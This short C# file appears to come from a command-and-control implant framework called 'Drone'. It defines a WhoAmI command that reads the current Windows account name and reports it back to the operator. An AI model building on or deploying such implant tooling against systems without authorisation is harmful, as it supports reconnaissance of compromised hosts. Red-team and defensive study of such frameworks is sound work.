using System.Security.Principal;
using System.Threading;

namespace Drone.Commands;

public sealed class WhoAmI : DroneCommand
{
    public override byte Command => 0x1E;
    public override bool Threaded => true;

    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var identity = WindowsIdentity.GetCurrent();
        Drone.SendTaskOutput(task.Id, identity.Name);
    }
}